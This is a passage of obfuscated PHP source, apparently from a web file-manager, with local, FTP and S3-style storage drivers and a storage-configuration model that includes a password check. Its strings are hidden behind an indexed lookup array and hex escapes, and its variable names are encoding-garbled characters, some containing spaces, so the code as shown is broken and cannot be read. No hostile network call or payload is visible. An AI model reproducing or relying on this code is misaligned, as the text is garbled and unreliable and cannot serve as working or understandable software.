$Ì¸ñÿÕ˙ = @ftp_chdir($this->connect, $–ıÁ≤ﬁß); if (!$Ì¸ñÿÕ˙) { return !1; } $©ı Û˛í[$√ Îƒéà[33]] = $√ Îƒéà[78]; } return $©ı Û˛í; } protected function _isFolder($Ë∫∫≈î–) { $ì–û≥◊Æ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($Ë∫∫≈î– == $ì–û≥◊Æ[12] || $Ë∫∫≈î– == $ì–û≥◊Æ[8]) { return !0; } $Ïéÿ›ƒ® = $this->_objectMeta($Ë∫∫≈î–); return isset($Ïéÿ›ƒ®[$ì–û≥◊Æ[33]]) && $Ïéÿ›ƒ®[$ì–û≥◊Æ[33]] == $ì–û≥◊Æ[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($õÉ»ÇÒ§) { parent::__construct($õÉ»ÇÒ§); $this->setSignVersion($_SERVER[ß⁄ˆÇ†Œ][247]); } public function uploadLink($÷™Ñó®ª, $„ó›¿Á° = 0) { $√Õí¯πÌ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->isUploadServer()) { return; } $∞¡ü”ı± = $this->getType(); if (!in_array($∞¡ü”ı±, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $˘ √ìøÌ = (!$„ó›¿Á° ? 1 : ceil($„ó›¿Á° / pow(1024, 3))) * 3600 * 4; $»äÁÇ–° = $this->multiUploadFormData($÷™Ñó®ª, $˘ √ìøÌ); if ($»äÁÇ–°) { $»äÁÇ–°[$√Õí¯πÌ[97]] = $÷™Ñó®ª; $»äÁÇ–°[$√Õí¯πÌ[98]] = $∞¡ü”ı±; } return $»äÁÇ–°; } public function fileOutImage($ÅÒ◊ôÊå, $ŒÑ¬Äﬂƒ = 250) { if ($this->size($ÅÒ◊ôÊå) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ÅÒ◊ôÊå, $ŒÑ¬Äﬂƒ); } $⁄ÁáâöÅ = $this->link($ÅÒ◊ôÊå); $⁄ÁáâöÅ .= $_SERVER[ß⁄ˆÇ†Œ][1447] . $ŒÑ¬Äﬂƒ; $this->fileOutLink($⁄ÁáâöÅ); } public function fileOutLink($ƒ¿·˜º›) { $ﬂ¡‹òØé =& $_SERVER[ß⁄ˆÇ†Œ]; if (substr($ƒ¿·˜º›, 0, 7) == $ﬂ¡‹òØé[313]) { $ƒ¿·˜º› = $ﬂ¡‹òØé[314] . substr($ƒ¿·˜º›, 7); } header($ﬂ¡‹òØé[175] . $ƒ¿·˜º›); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($∆”Ìã ƒ) { if (substr($∆”Ìã ƒ, 0, 2) == $_SERVER[ß⁄ˆÇ†Œ][1406]) { $∆”Ìã ƒ = BASIC_PATH . substr($∆”Ìã ƒ, 2); } return $∆”Ìã ƒ; } public function iconvApp($´â Ÿ€À) { $Óãö‡˛ß =& $_SERVER[ß⁄ˆÇ†Œ]; global $config; return $this->iconvTo($´â Ÿ€À, $config[$Óãö‡˛ß[1433]], $config[$Óãö‡˛ß[1432]]); } public function iconvSystem($ÂÁ•”í±) { $πàçÛÎ˙ =& $_SERVER[ß⁄ˆÇ†Œ]; global $config; return $this->iconvTo($ÂÁ•”í±, $config[$πàçÛÎ˙[1432]], $config[$πàçÛÎ˙[1433]]); } public function getPathOuter($›æ›™â’) { $Ù†ˆôà¨ =& $_SERVER[ß⁄ˆÇ†Œ]; $¡§ìú‘ú = $this->iconvApp($this->pathBase); $›æ›™â’ = $this->iconvApp($›æ›™â’); if (substr($¡§ìú‘ú, 0, 2) == $Ù†ˆôà¨[1406]) { $¡§ìú‘ú = BASIC_PATH . substr($¡§ìú‘ú, 2); } if (substr($›æ›™â’, 0, 2) == $Ù†ˆôà¨[1406]) { $›æ›™â’ = BASIC_PATH . substr($›æ›™â’, 2); } $¡§ìú‘ú = KodIO::clear($¡§ìú‘ú); $›æ›™â’ = KodIO::clear($›æ›™â’); $›æ›™â’ = substr($›æ›™â’, strlen($¡§ìú‘ú)); if (empty($this->pathDriver)) { return $›æ›™â’; } return $this->pathDriver . $Ù†ˆôà¨[8] . ltrim($›æ›™â’, $Ù†ˆôà¨[8]); } public function mkfile($˝‘°∆·ÿ, $”Æˆ¨ŒÇ = '', $´ñ∂Àâ° = REPEAT_RENAME) { $˝‘°∆·ÿ = $this->iconvSystem($˝‘°∆·ÿ); @touch($˝‘°∆·ÿ); if ($”Æˆ¨ŒÇ) { file_put_contents($˝‘°∆·ÿ, $”Æˆ¨ŒÇ); } @chmod($˝‘°∆·ÿ, $this->pathAuth); if (is_file($˝‘°∆·ÿ)) { return $this->getPathOuter($˝‘°∆·ÿ); } $this->writeLog(__FUNCTION__ . $_SERVER[ß⁄ˆÇ†Œ][1444], !0); return !1; } public function mkdir($£˝”é˚¬, $ŸΩë∫Ç“ = REPEAT_SKIP) { $£˝”é˚¬ = $this->iconvSystem($£˝”é˚¬); if (is_dir($£˝”é˚¬)) { return $this->getPathOuter($£˝”é˚¬); } @mkdir($£˝”é˚¬, $this->pathAuth, !0); @chmod($£˝”é˚¬, $this->pathAuth); if (is_dir($£˝”é˚¬)) { return $this->getPathOuter($£˝”é˚¬); } $this->writeLog(__FUNCTION__ . $_SERVER[ß⁄ˆÇ†Œ][1444], !0); return !1; } public function copyFile($π≤ï◊éº, $â¬≤Áõ·) { $this->mkdir($this->pathFather($â¬≤Áõ·)); $π≤ï◊éº = $this->iconvSystem($π≤ï◊éº); $â¬≤Áõ· = $this->iconvSystem($â¬≤Áõ·); $±ÂÌõµı = copy_64($π≤ï◊éº, $â¬≤Áõ·); @chmod($â¬≤Áõ·, $this->pathAuth); if ($±ÂÌõµı) { return $this->getPathOuter($â¬≤Áõ·); } $this->writeLog(__FUNCTION__ . $_SERVER[ß⁄ˆÇ†Œ][1444], !0); return !1; } public function moveFile($∞•‰òë∏, $–Ø¬“û ) { $this->mkdir($this->pathFather($–Ø¬“û )); $∞•‰òë∏ = $this->iconvSystem($∞•‰òë∏); $–Ø¬“û  = $this->iconvSystem($–Ø¬“û ); $◊·™ç’Ω = intval(@rename($∞•‰òë∏, $–Ø¬“û )); if (!$◊·™ç’Ω) { if ($◊·™ç’Ω = intval(@copy_64($∞•‰òë∏, $–Ø¬“û ))) { @unlink($∞•‰òë∏); } } @chmod($–Ø¬“û , $this->pathAuth); if ($◊·™ç’Ω) { return $this->getPathOuter($–Ø¬“û ); } $this->writeLog(__FUNCTION__ . $_SERVER[ß⁄ˆÇ†Œ][1444], !0); return !1; } public function movePath($ÏŸ÷¢Ñ‰, $·™ÿˆÁ‰, $ì≥∆≤ä£ = false) { $æÎ—Ó±Ó =& $_SERVER[ß⁄ˆÇ†Œ]; $ÏŸ÷¢Ñ‰ = $this->iconvSystem($ÏŸ÷¢Ñ‰); $·™ÿˆÁ‰ = $this->iconvSystem($·™ÿˆÁ‰); $“é∆·È˙ = rtrim($·™ÿˆÁ‰, $æÎ—Ó±Ó[8]) . $æÎ—Ó±Ó[8] . ($ì≥∆≤ä£ ? $ì≥∆≤ä£ : get_path_this($ÏŸ÷¢Ñ‰)); if (file_exists($“é∆·È˙)) { return !1; } $‚√˝Î§Á = intval(@rename($ÏŸ÷¢Ñ‰, $“é∆·È˙)); $‚√˝Î§Á = file_exists($“é∆·È˙); if ($‚√˝Î§Á) { return $this->getPathOuter($“é∆·È˙); } $this->writeLog(__FUNCTION__ . $æÎ—Ó±Ó[1444], !0); return !1; } public function delFile($Î÷ê˘ı∆) { $Î÷ê˘ı∆ = $this->iconvSystem($Î÷ê˘ı∆); if (!@unlink($Î÷ê˘ı∆)) { @chmod($Î÷ê˘ı∆, $this->pathAuth); if (@unlink($Î÷ê˘ı∆)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[ß⁄ˆÇ†Œ][1444], !0); return !1; } return !0; } public function delFolder($–òÍü¸Ö) { $ √÷ı⁄Ç =& $_SERVER[ß⁄ˆÇ†Œ]; $–òÍü¸Ö = $this->iconvSystem($–òÍü¸Ö); if (!is_dir($–òÍü¸Ö)) { return !0; } if (!($ä˛µ üã = opendir($–òÍü¸Ö))) { return !1; } while (($¥÷‡±ÂÎ = readdir($ä˛µ üã)) !== !1) { if ($¥÷‡±ÂÎ == $ √÷ı⁄Ç[10] || $¥÷‡±ÂÎ == $ √÷ı⁄Ç[1359]) { continue; } $•À⁄„¢ª = $–òÍü¸Ö . $ √÷ı⁄Ç[8] . $¥÷‡±ÂÎ; if (is_file($•À⁄„¢ª) || is_link($•À⁄„¢ª)) { if (!unlink($•À⁄„¢ª)) { chmod($•À⁄„¢ª, $this->pathAuth); if (!unlink($•À⁄„¢ª)) { return !1; } } } else { if (is_dir($•À⁄„¢ª)) { chmod($•À⁄„¢ª, $this->pathAuth); $•À⁄„¢ª = $this->iconvApp($•À⁄„¢ª); if (!$this->delFolder($•À⁄„¢ª)) { return !1; } } } } closedir($ä˛µ üã); return rmdir($–òÍü¸Ö); } public function rename($ëè‚„ô¯, $û‚—››®) { $¥ﬁ˚∆∆ù =& $_SERVER[ß⁄ˆÇ†Œ]; $‹Ä§»˙å = $this->fileNameAuto($this->pathFather($ëè‚„ô¯), $û‚—››®); $‹Ä§»˙å = $this->iconvSystem($‹Ä§»˙å); $ëè‚„ô¯ = $this->iconvSystem($ëè‚„ô¯); $ìß›®˛µ = $this->pathFather($ëè‚„ô¯); $ıÑ¡´∑‚ = rtrim($ìß›®˛µ, $¥ﬁ˚∆∆ù[8]) . $¥ﬁ˚∆∆ù[8] . $‹Ä§»˙å; $«Úõ»—¥ = @rename($ëè‚„ô¯, $ıÑ¡´∑‚); $ıÑ¡´∑‚ = $this->iconvApp($ıÑ¡´∑‚); if ($«Úõ»—¥) { return $this->getPathOuter($ıÑ¡´∑‚); } $this->writeLog(__FUNCTION__ . $¥ﬁ˚∆∆ù[1444], !0); return !1; } public function size($ê∑ÍŸﬁ) { $ê∑ÍŸﬁ = $this->iconvSystem($ê∑ÍŸﬁ); return filesize_64($ê∑ÍŸﬁ); } public function info($ÆËê‚‰®) { $ÆËê‚‰® = $this->iconvSystem($ÆËê‚‰®); if ($this->isFolder($ÆËê‚‰®)) { return $this->folderInfo($ÆËê‚‰®); } else { if ($this->isFile($ÆËê‚‰®)) { return $this->fileInfo($ÆËê‚‰®); } } return !1; } protected function infoChildren($˘∂≈ôµÃ, &$–ŒΩæΩ¡, $‰ ﬂü™ = true) { $¨à‚∫Åï =& $_SERVER[ß⁄ˆÇ†Œ]; check_abort_echo(); $˘∂≈ôµÃ = rtrim($˘∂≈ôµÃ, $¨à‚∫Åï[8]) . $¨à‚∫Åï[8]; if ($‰ ﬂü™) { $˘∂≈ôµÃ = $this->iconvSystem($˘∂≈ôµÃ); } if (!($»Ú∏õåô = @opendir($˘∂≈ôµÃ))) { return; } while (($ªÓëÿøÚ = readdir($»Ú∏õåô)) !== !1) { if ($ªÓëÿøÚ == $¨à‚∫Åï[10] || $ªÓëÿøÚ == $¨à‚∫Åï[1359]) { continue; } $ŒÉË≠“ò = $˘∂≈ôµÃ . $ªÓëÿøÚ; if (is_file($ŒÉË≠“ò) || is_link($ŒÉË≠“ò)) { $–ŒΩæΩ¡[$¨à‚∫Åï[80]]++; $–ŒΩæΩ¡[$¨à‚∫Åï[79]] += filesize_64($ŒÉË≠“ò); } else { if (is_dir($ŒÉË≠“ò)) { $–ŒΩæΩ¡[$¨à‚∫Åï[81]]++; $this->infoChildren($ŒÉË≠“ò, $–ŒΩæΩ¡, !1); } } } closedir($»Ú∏õåô); } private function folderInfo($ãÛÇÛ¬ë, $Ì‚õàÄ‚ = false) { $π‘û∫◊õ =& $_SERVER[ß⁄ˆÇ†Œ]; $ãÛÇÛ¬ë = rtrim($ãÛÇÛ¬ë, $π‘û∫◊õ[8]) . $π‘û∫◊õ[8]; $›äµäéÀ = $this->iconvApp($this->pathThis($ãÛÇÛ¬ë)); if ($Ì‚õàÄ‚) { return array($π‘û∫◊õ[32] => $›äµäéÀ, $π‘û∫◊õ[87] => $this->getPathOuter($ãÛÇÛ¬ë), $π‘û∫◊õ[33] => $π‘û∫◊õ[78]); } $÷âﬁè∏≤ = array($π‘û∫◊õ[32] => $›äµäéÀ, $π‘û∫◊õ[87] => $this->getPathOuter($ãÛÇÛ¬ë), $π‘û∫◊õ[33] => $π‘û∫◊õ[78], $π‘û∫◊õ[231] => @filectime($ãÛÇÛ¬ë), $π‘û∫◊õ[88] => @filemtime($ãÛÇÛ¬ë), $π‘û∫◊õ[1448] => @fileatime($ãÛÇÛ¬ë), $π‘û∫◊õ[1449] => is_readable($ãÛÇÛ¬ë), $π‘û∫◊õ[1450] => is_writable($ãÛÇÛ¬ë), $π‘û∫◊õ[1451] => get_mode($ãÛÇÛ¬ë)); return $÷âﬁè∏≤; } private function fileInfo($€„Î‡õ·, $‹õ†óá© = false) { $ó•∂Û≥» =& $_SERVER[ß⁄ˆÇ†Œ]; $≤€÷¢à¬ = $this->iconvApp($this->pathThis($€„Î‡õ·)); if ($‹õ†óá©) { return array($ó•∂Û≥»[32] => $≤€÷¢à¬, $ó•∂Û≥»[87] => $this->getPathOuter($€„Î‡õ·), $ó•∂Û≥»[33] => $ó•∂Û≥»[230], $ó•∂Û≥»[79] => $this->size($€„Î‡õ·), $ó•∂Û≥»[169] => $this->ext($≤€÷¢à¬)); } $Üƒ™ß¿ƒ = array($ó•∂Û≥»[32] => $≤€÷¢à¬, $ó•∂Û≥»[87] => $this->getPathOuter($€„Î‡õ·), $ó•∂Û≥»[33] => $ó•∂Û≥»[230], $ó•∂Û≥»[231] => @filectime($€„Î‡õ·), $ó•∂Û≥»[88] => @filemtime($€„Î‡õ·), $ó•∂Û≥»[1448] => @fileatime($€„Î‡õ·), $ó•∂Û≥»[79] => $this->size($€„Î‡õ·), $ó•∂Û≥»[169] => $this->ext($≤€÷¢à¬), $ó•∂Û≥»[1449] => is_readable($€„Î‡õ·), $ó•∂Û≥»[1450] => is_writable($€„Î‡õ·), $ó•∂Û≥»[1451] => get_mode($€„Î‡õ·)); return $Üƒ™ß¿ƒ; } public function exist($ÏÃá˝¨Ω) { $ÏÃá˝¨Ω = $this->iconvSystem($ÏÃá˝¨Ω); return @file_exists($ÏÃá˝¨Ω); } public function isFile($îü««ªº) { $îü««ªº = $this->iconvSystem($îü««ªº); return @is_file($îü««ªº); } public function isFolder($«¡≠ıË¶) { $«¡≠ıË¶ = $this->iconvSystem($«¡≠ıË¶); return @is_dir($«¡≠ıË¶); } public function listPath($ä¬ö®„≥, $Â∑§æ•ù = false) { $ΩöÕÓá˙ =& $_SERVER[ß⁄ˆÇ†Œ]; $ä¬ö®„≥ = $this->iconvSystem($ä¬ö®„≥); $ä¬ö®„≥ = rtrim($ä¬ö®„≥, $ΩöÕÓá˙[8]) . $ΩöÕÓá˙[8]; $‚µ±ô⁄ô = array($ΩöÕÓá˙[85] => array(), $ΩöÕÓá˙[86] => array()); if (!($ﬂàÿêôí = @opendir($ä¬ö®„≥))) { return $‚µ±ô⁄ô; } while (($îÔ≥ﬂ• = readdir($ﬂàÿêôí)) !== !1) { if ($îÔ≥ﬂ• == $ΩöÕÓá˙[10] || $îÔ≥ﬂ• == $ΩöÕÓá˙[1359]) { continue; } $€˙Ö¯Ü÷ = $ä¬ö®„≥ . $îÔ≥ﬂ•; if (is_file($€˙Ö¯Ü÷)) { $‚µ±ô⁄ô[$ΩöÕÓá˙[86]][] = $this->fileInfo($€˙Ö¯Ü÷, $Â∑§æ•ù); } else { $‚µ±ô⁄ô[$ΩöÕÓá˙[85]][] = $this->folderInfo($€˙Ö¯Ü÷, $Â∑§æ•ù); } } closedir($ﬂàÿêôí); return $‚µ±ô⁄ô; } public function listAll($ËÒØ≥åî, &$øıÉÇ≤Æ = array()) { $‘Ã‹åı£ =& $_SERVER[ß⁄ˆÇ†Œ]; $ËÒØ≥åî = $this->iconvSystem($ËÒØ≥åî); $ËÒØ≥åî = rtrim($ËÒØ≥åî, $‘Ã‹åı£[8]) . $‘Ã‹åı£[8]; if (!($˚ïÆÊ√Ø = @opendir($ËÒØ≥åî))) { return $øıÉÇ≤Æ; } while (($á∏‘˘Üˆ = readdir($˚ïÆÊ√Ø)) !== !1) { if ($á∏‘˘Üˆ == $‘Ã‹åı£[10] || $á∏‘˘Üˆ == $‘Ã‹åı£[1359]) { continue; } $§âı˚«∑ = $ËÒØ≥åî . $á∏‘˘Üˆ; $ñØÙ◊ﬂ˘ = is_dir($§âı˚«∑) && !is_link($§âı˚«∑) ? 1 : 0; $§âı˚«∑ = $ñØÙ◊ﬂ˘ ? $§âı˚«∑ . $‘Ã‹åı£[8] : $§âı˚«∑; $øıÉÇ≤Æ[] = array($‘Ã‹åı£[87] => $§âı˚«∑, $‘Ã‹åı£[78] => $ñØÙ◊ﬂ˘, $‘Ã‹åı£[88] => intval(@filemtime($§âı˚«∑)), $‘Ã‹åı£[79] => $ñØÙ◊ﬂ˘ ? 0 : intval($this->size($§âı˚«∑))); if ($ñØÙ◊ﬂ˘) { $this->listAll($§âı˚«∑, $øıÉÇ≤Æ); } } closedir($˚ïÆÊ√Ø); return $øıÉÇ≤Æ; } public function has($Àû“⁄úà, $˝≥Ù√ã = false, $ı•¿ºÜ˚ = true) { $°ëµ´»° =& $_SERVER[ß⁄ˆÇ†Œ]; $Àû“⁄úà = $this->iconvSystem($Àû“⁄úà); $Àû“⁄úà = rtrim($Àû“⁄úà, $°ëµ´»°[8]) . $°ëµ´»°[8]; if (!($çØë•—π = @opendir($Àû“⁄úà))) { return !1; } $∆€õÂÓÊ = 0; $´Ωº€—∏ = 0; $Ω⁄ÄñÒ„ = 0; while (($‰≥˚éÈ≥ = readdir($çØë•—π)) !== !1) { if ($‰≥˚éÈ≥ == $°ëµ´»°[10] || $‰≥˚éÈ≥ == $°ëµ´»°[1359]) { continue; } $®˚”‹“· = $Àû“⁄úà . $‰≥˚éÈ≥; if ($˝≥Ù√ã) { $Ω⁄ÄñÒ„++; if (@is_file($®˚”‹“·)) { $∆€õÂÓÊ++; } else { $´Ωº€—∏++; } if ($Ω⁄ÄñÒ„ > 10000) { break; } continue; } if ($ı•¿ºÜ˚) { if (@is_file($®˚”‹“·)) { return !0; } } else { if (@is_dir($®˚”‹“· . $°ëµ´»°[8])) { return !0; } } } closedir($çØë•—π); if ($˝≥Ù√ã) { return array($°ëµ´»°[239] => $∆€õÂÓÊ, $°ëµ´»°[240] => $´Ωº€—∏); } return !1; } public function hashSimple($§∞–ˆÀê) { $â€“∫’¶ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$§∞–ˆÀê) { return md5($â€“∫’¶[12]); } $§∞–ˆÀê = $this->iconvSystem($§∞–ˆÀê); $Çõ£â≥º = $this->size($§∞–ˆÀê); $Õ¶°¿•ö = 200; $À‘˚â ˜ = 50; if ($Çõ£â≥º <= $Õ¶°¿•ö * $À‘˚â ˜) { return $this->hashMd5($§∞–ˆÀê) . $Çõ£â≥º; } $“¨Ñèºò = $â€“∫’¶[12]; $™Ø”ÖÔ˛ = intval($Çõ£â≥º / $À‘˚â ˜); $••œ‚¶‹ = fopen($§∞–ˆÀê, $â€“∫’¶[1452]); if (!$••œ‚¶‹) { return $“¨Ñèºò; } for ($µü¸†Ò± = 0; $µü¸†Ò± < $À‘˚â ˜; $µü¸†Ò±++) { fseek_64($••œ‚¶‹, $™Ø”ÖÔ˛ * $µü¸†Ò±); $“¨Ñèºò .= fread($••œ‚¶‹, $Õ¶°¿•ö); } fseek_64($••œ‚¶‹, $Çõ£â≥º - $Õ¶°¿•ö); $“¨Ñèºò .= fread($••œ‚¶‹, $Õ¶°¿•ö); fclose($••œ‚¶‹); return md5($“¨Ñèºò) . $Çõ£â≥º; } public function getContent($ô¿ªñÌ⁄) { $ô¿ªñÌ⁄ = $this->iconvSystem($ô¿ªñÌ⁄); return file_get_contents($ô¿ªñÌ⁄); } public function setContent($Ÿã˛ØÎ¸, $æ÷ÖÎ∞‹ = '') { $Ÿã˛ØÎ¸ = $this->iconvSystem($Ÿã˛ØÎ¸); $ù°í˛ô√ = @file_put_contents($Ÿã˛ØÎ¸, $æ÷ÖÎ∞‹, LOCK_EX); if (!$ù°í˛ô√) { $this->writeLog(__FUNCTION__ . $_SERVER[ß⁄ˆÇ†Œ][1444], !0); } clearstatcache(); @chmod($Ÿã˛ØÎ¸, $this->pathAuth); return $ù°í˛ô√ === !1 ? !1 : !0; } public function fileSubstr($¸Å¿ßÑ°, $≥ÌíêÜ© = 0, $∞Çÿ›Ï˛ = false) { $Ãñ©¶ê¿ =& $_SERVER[ß⁄ˆÇ†Œ]; $¸Å¿ßÑ° = $this->iconvSystem($¸Å¿ßÑ°); if ($∞Çÿ›Ï˛ === !1) { $∞Çÿ›Ï˛ = $this->size($¸Å¿ßÑ°); } if ($∞Çÿ›Ï˛ <= 0) { return $Ãñ©¶ê¿[12]; } $ßΩûòí≈ = fopen($¸Å¿ßÑ°, $Ãñ©¶ê¿[1452]); if (!$ßΩûòí≈) { return !1; } fseek_64($ßΩûòí≈, $≥ÌíêÜ©); $¥óÅÍ‹† = fread($ßΩûòí≈, $∞Çÿ›Ï˛); fclose($ßΩûòí≈); if (!$¥óÅÍ‹†) { $this->writeLog(__FUNCTION__ . $Ãñ©¶ê¿[1444], !0); } return $¥óÅÍ‹†; } public function upload($˝ÂßŸä∫, $ôœœ™∞¸, $«°±‘€∑ = false, $¨ÛÍΩ‡¡ = REPEAT_REPLACE) { if ($«°±‘€∑) { return $this->moveFile($ôœœ™∞¸, $˝ÂßŸä∫); } return $this->copyFile($ôœœ™∞¸, $˝ÂßŸä∫); } public function setModifyTime($ ¶ı≠Œ˚, $Áò¿¶Ò˚ = '') { @touch($ ¶ı≠Œ˚, intval($Áò¿¶Ò˚)); } public function download($À≠∏Æåä, $ÿ†É–å˝) { return $this->iconvSystem($À≠∏Æåä); } } goto E• ç„é†; Cœôê∆ıòÌ: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\x2e\163\x74\157\x72\x61\x67\x65\x4c\x69\163\164"; public $field = array("\156\x61\x6d\145", "\163\151\x7a\x65\x4d\x61\170", "\x73\x79\x73\x74\x65\x6d", "\x64\x65\x66\x61\165\x6c\164", "\x64\162\x69\x76\145\x72", "\143\x6f\x6e\146\151\x67"); public function listData($≤üÌÄ“ù = false, $—˘»£ß≥ = "\155\157\144\x69\146\x79\124\x69\x6d\145", $€€…†‰Õ = false) { $‚îÍŸ“û =& $_SERVER[ß⁄ˆÇ†Œ]; $ïõ‡¬á¸ = parent::listData($≤üÌÄ“ù, $—˘»£ß≥, $€€…†‰Õ); if ($≤üÌÄ“ù) { return $ïõ‡¬á¸; } $èÎ∂ªã = array(); if ($GLOBALS[$‚îÍŸ“û[2290]]) { $èÎ∂ªã = $this->ioSizeUseGet(array_to_keyvalue($ïõ‡¬á¸, $‚îÍŸ“û[12], $‚îÍŸ“û[483])); } foreach ($ïõ‡¬á¸ as $ü∂…˚†ë => $ß¡§¨ÿœ) { unset($ïõ‡¬á¸[$ü∂…˚†ë][$‚îÍŸ“û[6]]); $ïõ‡¬á¸[$ü∂…˚†ë][$‚îÍŸ“û[1951]] = isset($èÎ∂ªã[$ß¡§¨ÿœ[$‚îÍŸ“û[483]]]) ? $èÎ∂ªã[$ß¡§¨ÿœ[$‚îÍŸ“û[483]]] : 0; } return $ïõ‡¬á¸; } public function ioSizeUseGet($È˘î›ñÛ) { $û∞êÂﬁ€ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$È˘î›ñÛ) { return array(); } $öºˆèçÎ = $û∞êÂﬁ€[2291] . implode($û∞êÂﬁ€[50], $È˘î›ñÛ); $˘ÿª€Ù´ = Cache::get($öºˆèçÎ); if ($˘ÿª€Ù´) { return $˘ÿª€Ù´; } $î®Î˛∫Ÿ = array($û∞êÂﬁ€[890] => $û∞êÂﬁ€[483], $û∞êÂﬁ€[2292] => $û∞êÂﬁ€[79]); $’Óù˚âﬂ = array($û∞êÂﬁ€[890] => array($û∞êÂﬁ€[7], $È˘î›ñÛ)); $˘ÿª€Ù´ = Model($û∞êÂﬁ€[862])->field($î®Î˛∫Ÿ)->where($’Óù˚âﬂ)->group($û∞êÂﬁ€[890])->select(); $˘ÿª€Ù´ = array_to_keyvalue($˘ÿª€Ù´, $û∞êÂﬁ€[483], $û∞êÂﬁ€[79]); Cache::set($öºˆèçÎ, $˘ÿª€Ù´, 600); return $˘ÿª€Ù´; } public function getConfig($Îã·ÃÅò) { $“˜ö˝Á¯ = parent::listData($Îã·ÃÅò); return json_decode($“˜ö˝Á¯[$_SERVER[ß⁄ˆÇ†Œ][6]], !0); } public function update($πÒ¯Æôº, $Ç•¥¢≤) { $ËÅ°ú  =& $_SERVER[ß⁄ˆÇ†Œ]; $ìƒèˆÕÄ = $Ç•¥¢≤[$ËÅ°ú [32]]; $¥óÁœıÛ = array_to_keyvalue(parent::listData(), $ËÅ°ú [32]); if (isset($¥óÁœıÛ[$ìƒèˆÕÄ]) && $¥óÁœıÛ[$ìƒèˆÕÄ][$ËÅ°ú [483]] != $πÒ¯Æôº) { return !1; } $this->checkPwd($πÒ¯Æôº, $Ç•¥¢≤); if (isset($Ç•¥¢≤[$ËÅ°ú [2293]]) && $Ç•¥¢≤[$ËÅ°ú [2293]] == $ËÅ°ú [91]) { $this->checkConfig($Ç•¥¢≤); } unset($Ç•¥¢≤[$ËÅ°ú [2293]]); $ß ÑÛÏ˚ = parent::update($πÒ¯Æôº, $Ç•¥¢≤); if ($ß ÑÛÏ˚ && $Ç•¥¢≤[$ËÅ°ú [37]]) { $¨¶ä¡â˝ = 0; foreach ($¥óÁœıÛ as $ËıÊ§≠∆) { if ($ËıÊ§≠∆[$ËÅ°ú [37]] && $ËıÊ§≠∆[$ËÅ°ú [483]] != $πÒ¯Æôº) { $¨¶ä¡â˝ = $ËıÊ§≠∆[$ËÅ°ú [483]]; parent::update($ËıÊ§≠∆[$ËÅ°ú [483]], array($ËÅ°ú [37] => 0)); } } $this->updateBackup($πÒ¯Æôº, $¨¶ä¡â˝); } return $ß ÑÛÏ˚; } public function add($Ø„‹∆ï‡) { $ıÍ˜íΩ° =& $_SERVER[ß⁄ˆÇ†Œ]; $≤°≤äáœ = array_to_keyvalue(parent::listData(), $ıÍ˜íΩ°[32]); if (isset($≤°≤äáœ[$Ø„‹∆ï‡[$ıÍ˜íΩ°[32]]])) { return !1; } $this->checkConfig($Ø„‹∆ï‡); $•»ÒÑ£≥ = parent::insert($Ø„‹∆ï‡); if ($•»ÒÑ£≥ && $Ø„‹∆ï‡[$ıÍ˜íΩ°[37]]) { foreach ($≤°≤äáœ as $Î¢≈Ôöñ) { if ($Î¢≈Ôöñ[$ıÍ˜íΩ°[37]]) { parent::update($Î¢≈Ôöñ[$ıÍ˜íΩ°[483]], array($ıÍ˜íΩ°[37] => 0)); } } } return $•»ÒÑ£≥; } public function updateBackup($Á∆¶˘ü¥, $ÊŸµ¥»¢) { $ô¡“˜Öµ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$ÊŸµ¥»¢) { return; } $ˆÓÌ‹Ö£ = Model($ô¡“˜Öµ[821])->config(); if ($ˆÓÌ‹Ö£[$ô¡“˜Öµ[1734]] != $ô¡“˜Öµ[91] || $ˆÓÌ‹Ö£[$ô¡“˜Öµ[825]] != $ÊŸµ¥»¢) { return; } $¥Á‘◊ƒ‚ = Model($ô¡“˜Öµ[843])->get($ô¡“˜Öµ[856]); $¥Á‘◊ƒ‚ = json_decode($¥Á‘◊ƒ‚, !0); if (!$¥Á‘◊ƒ‚) { return; } $¥Á‘◊ƒ‚[$ô¡“˜Öµ[825]] = $Á∆¶˘ü¥; Model($ô¡“˜Öµ[843])->set(array($ô¡“˜Öµ[856] => $¥Á‘◊ƒ‚)); } public function checkPwd($ä≤”îÿø, &$õ›ƒå®°) { $Î˚ˆÔöé =& $_SERVER[ß⁄ˆÇ†Œ]; if (empty($õ›ƒå®°[$Î˚ˆÔöé[6]])) { return; } $∞Ì‡Ü£´ = json_decode($õ›ƒå®°[$Î˚ˆÔöé[6]], !0); $Ùàû‹Ÿü = $Î˚ˆÔöé[12]; $¨ùë´∑ä = array($Î˚ˆÔöé[2294], $Î˚ˆÔöé[2295], $Î˚ˆÔöé[963]); foreach ($¨ùë´∑ä as $„◊™Ü„ö) { if (isset($∞Ì‡Ü£´[$„◊™Ü„ö])) { $Ùàû‹Ÿü = $„◊™Ü„ö; break; } } if (!$Ùàû‹Ÿü) { return; } $Ûùÿˆõ™ = $this->getConfig($ä≤”îÿø); $π†œ÷—  = $Ûùÿˆõ™[$Ùàû‹Ÿü]; $é·∫ÕÌÓ = $∞Ì‡Ü£´[$Ùàû‹Ÿü]; if ($é·∫ÕÌÓ == str_repeat($Î˚ˆÔöé[220], strlen($π†œ÷— ))) { $∞Ì‡Ü£´[$Ùàû‹Ÿü] = $π†œ÷— ; $õ›ƒå®°[$Î˚ˆÔöé[6]] = json_encode($∞Ì‡Ü£´); } else { if ($é·∫ÕÌÓ != $π†œ÷— ) { $õ›ƒå®°[$Î˚ˆÔöé[2293]] = $Î˚ˆÔöé[91]; } } } public function checkConfig(&$¬ÛÒ˜Èï, $ºò˙Ë‹Ü = false) { $ÈôÄ™œÏ =& $_SERVER[ß⁄ˆÇ†Œ]; $ØûÚ‹√  = strtolower($¬ÛÒ˜Èï[$ÈôÄ™œÏ[98]]); $Ñ©æÑØÿ = json_decode($¬ÛÒ˜Èï[$ÈôÄ™œÏ[6]], !0); foreach ($Ñ©æÑØÿ as $º—ñ…Ÿª => $≈ü˝öë‚) { if 